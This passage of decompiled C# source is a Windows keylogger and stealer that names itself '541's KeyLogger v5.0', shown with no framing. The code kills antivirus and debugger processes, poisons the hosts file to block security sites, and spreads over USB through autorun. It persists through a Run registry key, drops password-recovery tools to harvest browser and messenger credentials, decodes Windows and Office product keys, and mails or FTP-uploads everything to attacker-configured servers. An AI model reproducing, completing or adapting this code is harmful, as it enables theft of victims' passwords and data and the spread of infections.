			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(rc4(lblUsername.get_Text(), "Hello"), rc4(lblPassword.get_Text(), "Hello"));
			smtpClient.Send(mailMessage);
			((TextBoxBase)TextBox1).Clear();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Timer2.Stop();
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0872: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Visible(false);
		checked
		{
			try
			{
				FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
				HisUsrnme = Strings.Space((int)FileSystem.LOF(1));
				HisPsswrd = Strings.Space((int)FileSystem.LOF(1));
				Hisintval = Strings.Space((int)FileSystem.LOF(1));
				DisableHisTaskMgr = Strings.Space((int)FileSystem.LOF(1));
				DisableHisCMD = Strings.Space((int)FileSystem.LOF(1));
				DisableHisRegistry = Strings.Space((int)FileSystem.LOF(1));
				HisStartUp = Strings.Space((int)FileSystem.LOF(1));
				HisName = Strings.Space((int)FileSystem.LOF(1));
				HisInfo = Strings.Space((int)FileSystem.LOF(1));
				DisFirewall = Strings.Space((int)FileSystem.LOF(1));
				HisFake = Strings.Space((int)FileSystem.LOF(1));
				HisTitle = Strings.Space((int)FileSystem.LOF(1));
				HisMessage = Strings.Space((int)FileSystem.LOF(1));
				FTPHost = Strings.Space((int)FileSystem.LOF(1));
				FTPUsername = Strings.Space((int)FileSystem.LOF(1));
				FTPPassword = Strings.Space((int)FileSystem.LOF(1));
				Melt = Strings.Space((int)FileSystem.LOF(1));
				EPort = Strings.Space((int)FileSystem.LOF(1));
				ESMTP = Strings.Space((int)FileSystem.LOF(1));
				Win = Strings.Space((int)FileSystem.LOF(1));
				FTPBack = Strings.Space((int)FileSystem.LOF(1));
				DisSysRes = Strings.Space((int)FileSystem.LOF(1));
				DisShow = Strings.Space((int)FileSystem.LOF(1));
				Downloader = Strings.Space((int)FileSystem.LOF(1));
				DownloadURL = Strings.Space((int)FileSystem.LOF(1));
				DownloadFilename = Strings.Space((int)FileSystem.LOF(1));
				DownloadSP = Strings.Space((int)FileSystem.LOF(1));
				WB = Strings.Space((int)FileSystem.LOF(1));
				Anti = Strings.Space((int)FileSystem.LOF(1));
				CustomWebsite = Strings.Space((int)FileSystem.LOF(1));
				USB = Strings.Space((int)FileSystem.LOF(1));
				Saved = Strings.Space((int)FileSystem.LOF(1));
				App = Strings.Space((int)FileSystem.LOF(1));
				Exti = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref HisUsrnme, -1L, false);
				FileSystem.FileGet(1, ref HisPsswrd, -1L, false);
				FileSystem.FileGet(1, ref Hisintval, -1L, false);
				FileSystem.FileGet(1, ref DisableHisTaskMgr, -1L, false);
				FileSystem.FileGet(1, ref DisableHisCMD, -1L, false);
				FileSystem.FileGet(1, ref DisableHisRegistry, -1L, false);
				FileSystem.FileGet(1, ref HisStartUp, -1L, false);
				FileSystem.FileGet(1, ref HisName, -1L, false);
				FileSystem.FileGet(1, ref HisInfo, -1L, false);
				FileSystem.FileGet(1, ref DisFirewall, -1L, false);
				FileSystem.FileGet(1, ref HisFake, -1L, false);
				FileSystem.FileGet(1, ref HisTitle, -1L, false);
				FileSystem.FileGet(1, ref HisMessage, -1L, false);
				FileSystem.FileGet(1, ref FTPHost, -1L, false);
				FileSystem.FileGet(1, ref FTPUsername, -1L, false);
				FileSystem.FileGet(1, ref FTPPassword, -1L, false);
				FileSystem.FileGet(1, ref Melt, -1L, false);
				FileSystem.FileGet(1, ref EPort, -1L, false);
				FileSystem.FileGet(1, ref ESMTP, -1L, false);
				FileSystem.FileGet(1, ref Win, -1L, false);
				FileSystem.FileGet(1, ref FTPBack, -1L, false);
				FileSystem.FileGet(1, ref DisSysRes, -1L, false);
				FileSystem.FileGet(1, ref DisShow, -1L, false);
				FileSystem.FileGet(1, ref Downloader, -1L, false);
				FileSystem.FileGet(1, ref DownloadURL, -1L, false);
				FileSystem.FileGet(1, ref DownloadFilename, -1L, false);
				FileSystem.FileGet(1, ref DownloadSP, -1L, false);
				FileSystem.FileGet(1, ref WB, -1L, false);
				FileSystem.FileGet(1, ref Anti, -1L, false);
				FileSystem.FileGet(1, ref CustomWebsite, -1L, false);
				FileSystem.FileGet(1, ref USB, -1L, false);
				FileSystem.FileGet(1, ref Saved, -1L, false);
				FileSystem.FileGet(1, ref App, -1L, false);
				FileSystem.FileGet(1, ref Exti, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				options = Strings.Split(HisUsrnme, "@541@", -1, (CompareMethod)0);
				lblUsername.set_Text(options[1]);
				lblPassword.set_Text(options[2]);
				lblInterval.set_Text(options[3]);
				lblTaskManager.set_Text(options[4]);
				lblCMD.set_Text(options[5]);
				lblRegistryTools.set_Text(options[6]);
				lblStartUp.set_Text(options[7]);
				lblFileName.set_Text(options[8]);
				lblInfo.set_Text(options[9]);
				lblFirewall.set_Text(options[10]);
				lblFake.set_Text(options[11]);
				txtTitle.set_Text(options[12]);
				txtContent.set_Text(options[13]);
				lblHost.set_Text(options[14]);
				lblFTPUsername.set_Text(options[15]);
				lblFTPPassword.set_Text(options[16]);
				lblMelt.set_Text(options[17]);
				lblPort.set_Text(options[18]);
				lblSMTP.set_Text(options[19]);
				lblWin.set_Text(options[20]);
				lblFTPBack.set_Text(options[21]);
				lblSysRes.set_Text(options[22]);
				lblShow.set_Text(options[23]);
				lblDownloader.set_Text(options[24]);
				lblDownloadURL.set_Text(options[25]);
				lblDownloadFN.set_Text(options[26]);
				lblDownloadSP.set_Text(options[27]);
				lblWB.set_Text(options[28]);
				lblAnti.set_Text(options[29]);
				lblCusWes.set_Text(options[30]);
				lblUSB.set_Text(options[31]);
				lblSaved.set_Text(options[32]);
				lblApp.set_Text(options[33]);
				lblExt.set_Text(options[34]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(lblFake.get_Text(), "Activated", false) == 0)
			{
				MessageBox.Show(txtContent.get_Text(), txtTitle.get_Text(), (MessageBoxButtons)0);
			}
			if (Operators.CompareString(lblWB.get_Text(), "Activated", false) == 0)
			{
				Websites();
			}
			if (Operators.CompareString(lblUSB.get_Text(), "Activated", false) == 0)
			{
				USBSpread();
			}
			if (Operators.CompareString(lblInfo.get_Text(), "Activated", false) == 0)
			{
				IPStealer();
			}
			if (Operators.CompareString(lblAnti.get_Text(), "Activated", false) == 0)
			{
				AntiKeyscrambler();
				AntiWireshark();
				AntiAnubis();
				AntiMalwarebytes();
				AntiKaspersky();
				AntiOllydbg();
				AntiOutpost();
				AntiNorman();
				AntiBitDefender();
				AntiNOD32();
				AntiZoneAlarm();
				Avira();
			}
			try
			{
				Timer1.Start();
				Timer2.Start();
				if (Operators.CompareString(lblFTPBack.get_Text(), "Activated", false) == 0)
				{
					Timer3.Start();
				}
				if (Operators.CompareString(lblWin.get_Text(), "Activated", false) == 0)
				{
					Timer4.Start();
				}
				if (Operators.CompareString(lblSaved.get_Text(), "Activated", false) == 0)
				{
					Timer5.Start();
				}
				if (Operators.CompareString(lblInfo.get_Text(), "Activated", false) == 0)
				{
					Timer6.Start();
				}
				if (Operators.CompareString(lblApp.get_Text(), "Activated", false) == 0)
				{
					Timer7.Start();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			Timer8.Start();
			Timer9.Start();
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = ((ServerComputer)MyProject.Computer).get_Name() + DateTime.Now.ToString().Replace("/", "-").Replace(" ", "---")
				.Replace(":", "-");
			string text2 = WindowsPath + "\\system32\\" + text + ".html";
			StreamWriter streamWriter = new StreamWriter(text2, append: true);
			streamWriter.Write(TextBox1.get_Text());
			streamWriter.Close();
			Timer3.set_Interval(checked((int)Math.Round(Conversions.ToDouble(lblInterval.get_Text()) * Conversions.ToDouble("60000"))));
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + lblHost.get_Text() + "/" + text + ".html");
			ftpWebRequest.Credentials = new NetworkCredential(lblFTPUsername.get_Text(), lblFTPPassword.get_Text());
			ftpWebRequest.Method = "STOR";
			byte[] array = File.ReadAllBytes(text2);
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			requestStream.Dispose();
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Timer3.Stop();
			ProjectData.ClearProjectError();
		}
	}

	public void Avira()
	{
		string strProcessToKill = "avcenter";
		killProcess(ref strProcessToKill);
		strProcessToKill = "avnotify";
		killProcess(ref strProcessToKill);
	}

	public void AntiKeyscrambler()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "keyscrambler", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiWireshark()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "wireshark", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiAnubis()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "anubis", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiMalwarebytes()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "mbam", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiKaspersky()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "avp", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiOllydbg()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "ollydbg", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiOutpost()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "outpost", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiNorman()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "npfmsg", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiBitDefender()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "bdagent", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiNOD32()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "egui", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void AntiZoneAlarm()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "zlclient", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		SmtpClient smtpClient = default(SmtpClient);
		MailMessage mailMessage = default(MailMessage);
		byte[] registryDigitalProductId = default(byte[]);
		string text = default(string);
		byte[] registryDigitalProductId2 = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 741:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_003b;
						case 4:
							goto IL_0044;
						case 5:
							goto IL_004e;
						case 6:
							goto IL_0080;
						case 7:
							goto IL_00a9;
						case 8:
							goto IL_00b2;
						case 9:
							goto IL_00d4;
						case 10:
							goto IL_00f9;
						case 11:
							goto IL_0102;
						case 12:
							goto IL_010d;
						case 13:
							goto IL_0137;
						case 14:
							goto IL_0140;
						case 15:
							goto IL_014a;
						case 16:
							goto IL_016e;
						case 17:
							goto IL_0192;
						case 18:
							goto IL_01b0;
						case 19:
							goto IL_01c5;
						case 20:
							goto IL_01db;
						case 21:
							goto IL_01f6;
						case 22:
							goto IL_0202;
						case 23:
							goto IL_023c;
						case 24:
							goto IL_0248;
						case 25:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 26:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0248:
					num = 24;
					((TextBoxBase)txtWin).Clear();
					break;
					IL_023c:
					num = 23;
					smtpClient.Send(mailMessage);
					goto IL_0248;
					IL_000a:
					num = 2;
					txtWin.set_Text(txtWin.get_Text() + DateAndTime.get_Now().ToString() + "\r\n\r\n");
					goto IL_003b;
					IL_003b:
					ProjectData.ClearProjectError();
					num3 = -3;
					goto IL_0044;
					IL_0044:
					num = 4;
					registryDigitalProductId = KeyDecoder.GetRegistryDigitalProductId(KeyDecoder.Key.XP);
					goto IL_004e;
					IL_004e:
					num = 5;
					txtWin.set_Text(txtWin.get_Text() + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "\r\n");
					goto IL_0080;
					IL_0080:
					num = 6;
					txtWin.set_Text(txtWin.get_Text() + KeyDecoder.DecodeProductKey(registryDigitalProductId) + "\r\n\r\n");
					goto IL_00a9;
					IL_00a9:
					ProjectData.ClearProjectError();
					num3 = -4;
					goto IL_00b2;
					IL_00b2:
					num = 8;
					text = (string)Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-002F-0000-0000-0000000FF1CE}")!.GetValue("ProductName");
					goto IL_00d4;
					IL_00d4:
					num = 9;
					txtWin.set_Text(txtWin.get_Text() + text + "\r\n");
					goto IL_00f9;
					IL_00f9:
					ProjectData.ClearProjectError();
					num3 = -5;
					goto IL_0102;
					IL_0102:
					num = 11;
					registryDigitalProductId2 = KeyDecoder.GetRegistryDigitalProductId(KeyDecoder.Key.Office12);
					goto IL_010d;
					IL_010d:
					num = 12;
					txtWin.set_Text(txtWin.get_Text() + KeyDecoder.DecodeProductKey(registryDigitalProductId2) + "\r\n\r\n");
					goto IL_0137;
					IL_0137:
					ProjectData.ClearProjectError();
					num3 = -6;
					goto IL_0140;
					IL_0140:
					num = 14;
					mailMessage = new MailMessage();
					goto IL_014a;
					IL_014a:
					num = 15;
					mailMessage.From = new MailAddress(rc4(lblUsername.get_Text(), "Hello"));
					goto IL_016e;
					IL_016e:
					num = 16;
					mailMessage.To.Add(rc4(lblUsername.get_Text(), "Hello"));
					goto IL_0192;
					IL_0192:
					num = 17;
					mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name() + " :541's KeyLogger v5.0: Win XP/Vista/7/Office Key Stealer";
					goto IL_01b0;
					IL_01b0:
					num = 18;
					mailMessage.Body = txtWin.get_Text();
					goto IL_01c5;
					IL_01c5:
					num = 19;
					smtpClient = new SmtpClient(lblSMTP.get_Text());
					goto IL_01db;
					IL_01db:
					num = 20;
					smtpClient.Port = Conversions.ToInteger(lblPort.get_Text());
					goto IL_01f6;
					IL_01f6:
					num = 21;
					smtpClient.EnableSsl = true;
					goto IL_0202;
					IL_0202:
					num = 22;
					smtpClient.Credentials = new NetworkCredential(rc4(lblUsername.get_Text(), "Hello"), rc4(lblPassword.get_Text(), "Hello"));
					goto IL_023c;
					end_IL_0001_2:
					break;
				}
				num = 25;
				Timer4.Stop();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 741;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Websites()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath + "\\drivers\\etc\\\\hosts";
		StreamWriter streamWriter = new StreamWriter(path);
		streamWriter.Write("##Hosts file edit");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.google.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 google.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 209.85.231.104");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.virustotal.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 virustotal.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.scanner.novirusthanks.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 scanner.novirusthanks.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.f-secure.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 f-secure.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.kaspersky.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 kaspersky.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.bitdefender.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 bitdefender.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.eset.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 eset.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.virusscan.jotti.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 virusscan.jotti.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.home.mcafee.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 home.mcafee.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.onlinescan.avast.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 onlinescan.avast.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.viruschief.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 viruschief.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.fortiguard.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 fortiguard.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www." + lblCusWes.get_Text());
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 " + lblCusWes.get_Text());
		streamWriter.Write(Environment.NewLine);
		streamWriter.Dispose();
	}

	private void IPStealer()
	{
		try
		{
			stats = Encoding.ASCII.GetString(webclient.DownloadData("http://whatismyip.com/automation/n09230945.asp"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void USBSpread()
	{
		Path.GetFileName(Application.get_ExecutablePath());
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)true, RegistryValueKind.DWord);
		string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (!programFiles.Contains(text))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + "System32.exe", true);
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text + "autorun.inf", "[autorun]\r\nopen=" + text + "System32.exe\r\nshellexecute=" + text, true);
				FileSystem.SetAttr(text + "System32.exe", (FileAttribute)2);
				FileSystem.SetAttr(text + "autorun.inf", (FileAttribute)2);
			}
		}
	}

	public static string rc4(string message, string password)
	{
		int num = 0;
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		string empty = string.Empty;
		int[] array = new int[257];
		int[] array2 = new int[257];
		int length = password.Length;
		int location = 0;
		while (location <= 255)
		{
			char c = password.Substring(location % length, 1).ToCharArray()[0];
			array2[location] = Strings.Asc(c);
			array[location] = location;
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		int num3 = 0;
		int location2 = 0;
		while (location2 <= 255)
		{
			num3 = checked(num3 + array[location2] + array2[location2]) % 256;
			int num4 = array[location2];
			array[location2] = array[num3];
			array[num3] = num4;
			Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
		}
		location = 1;
		while (location <= message.Length)
		{
			int num5 = 0;
			num = checked(num + 1) % 256;
			num2 = checked(num2 + array[num]) % 256;
			num5 = array[num];
			array[num] = array[num2];
			array[num2] = num5;
			int num6 = array[checked(array[num] + array[num2]) % 256];
			checked
			{
				char c2 = message.Substring(location - 1, 1).ToCharArray()[0];
				num5 = Strings.Asc(c2);
				int num7 = num5 ^ num6;
				stringBuilder.Append(Strings.Chr(num7));
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
		empty = stringBuilder.ToString();
		stringBuilder.Length = 0;
		return empty;
	}

	public string DialUpPWshow()
	{
		byte[] dialupass = Resources.Dialupass;
		FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\dialup.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, (Array)dialupass, -1L, false, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.Shell(Interaction.Environ("tmp") + "\\dialup.exe /stext " + Interaction.Environ("tmp") + "\\du.txt", (AppWinStyle)0, false, -1);
		return File.ReadAllText(Interaction.Environ("tmp") + "\\du.txt");
	}

	public string IE()
	{
		byte[] iepv = Resources.iepv;
		FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\iepv.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, (Array)iepv, -1L, false, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.Shell(Interaction.Environ("tmp") + "\\iepv.exe /stext " + Interaction.Environ("tmp") + "\\iepv.txt", (AppWinStyle)0, false, -1);
		return File.ReadAllText(Interaction.Environ("tmp") + "\\iepv.txt");
	}

	public string mess()
	{
		byte[] mspass = Resources.mspass;
		FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\mspass.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, (Array)mspass, -1L, false, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.Shell(Interaction.Environ("tmp") + "\\mspass.exe /stext " + Interaction.Environ("tmp") + "\\mess.txt", (AppWinStyle)0, false, -1);
		return File.ReadAllText(Interaction.Environ("tmp") + "\\mess.txt");
	}

	public string firefoxpass()
	{
		byte[] passwordFox = Resources.PasswordFox;
		FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\passwordfox.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, (Array)passwordFox, -1L, false, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.Shell(Interaction.Environ("tmp") + "\\passwordfox.exe /stext " + Interaction.Environ("tmp") + "\\firefox.txt", (AppWinStyle)0, false, -1);
		return File.ReadAllText(Interaction.Environ("tmp") + "\\firefox.txt");
	}

	public string chrome()
	{
		byte[] chromePass = Resources.ChromePass;
		FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\ChromePass.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, (Array)chromePass, -1L, false, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.Shell(Interaction.Environ("tmp") + "\\ChromePass.exe /stext " + Interaction.Environ("tmp") + "\\ChromePass.txt", (AppWinStyle)0, false, -1);
		return File.ReadAllText(Interaction.Environ("tmp") + "\\ChromePass.txt");
	}

	public string opera()
	{
		byte[] chromePass = Resources.ChromePass;
		FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\OperaPassView.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, (Array)chromePass, -1L, false, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.Shell(Interaction.Environ("tmp") + "\\OperaPassView.exe /stext " + Interaction.Environ("tmp") + "\\OperaPassView.txt", (AppWinStyle)0, false, -1);
		return File.ReadAllText(Interaction.Environ("tmp") + "\\OperaPassView.txt");
	}

	private void Timer5_Tick(object sender, EventArgs e)
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
			DialUpPWshow();
			firefoxpass();
			mess();
			IE();
			chrome();
			opera();
			TextBox3.set_Text(File.ReadAllText(Interaction.Environ("tmp") + "\\firefox.txt") + File.ReadAllText(Interaction.Environ("tmp") + "\\du.txt") + File.ReadAllText(Interaction.Environ("tmp") + "\\mess.txt") + File.ReadAllText(Interaction.Environ("tmp") + "\\iepv.txt") + File.ReadAllText(Interaction.Environ("tmp") + "\\ChromePass.txt") + File.ReadAllText(Interaction.Environ("tmp") + "\\OperaPassView.txt"));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(rc4(lblUsername.get_Text(), "Hello"));
			mailMessage.To.Add(rc4(lblUsername.get_Text(), "Hello"));
			mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name() + " :541's KeyLogger v5.0: Browsers/IM Stealer";
			mailMessage.Body = TextBox3.get_Text();
			SmtpClient smtpClient = new SmtpClient(lblSMTP.get_Text());
			smtpClient.Port = Conversions.ToInteger(lblPort.get_Text());
			smtpClient.Credentials = new NetworkCredential(rc4(lblUsername.get_Text(), "Hello"), rc4(lblPassword.get_Text(), "Hello"));
			smtpClient.EnableSsl = true;
			smtpClient.Send(mailMessage);
			((TextBoxBase)TextBox3).Clear();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Timer5.Stop();
			ProjectData.ClearProjectError();
		}
		Timer5.Stop();
	}

	private void Timer6_Tick(object sender, EventArgs e)
	{
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name() + " :541's KeyLogger v5.0: Info Stealer";
			mailMessage.To.Add(rc4(lblUsername.get_Text(), "Hello"));
			mailMessage.From = new MailAddress(rc4(lblUsername.get_Text(), "Hello"));
			mailMessage.Body = "User Name: " + Environment.UserName + "\r\nPC Name: " + ((ServerComputer)MyProject.Computer).get_Name() + "\r\nOS Version: " + Environment.OSVersion.ToString() + "\r\nWindows System Root: " + Environment.SystemDirectory.ToString() + "\r\nIP: " + stats;
			SmtpClient smtpClient = new SmtpClient(lblSMTP.get_Text());
			smtpClient.Port = Conversions.ToInteger(lblPort.get_Text());
			smtpClient.EnableSsl = true;
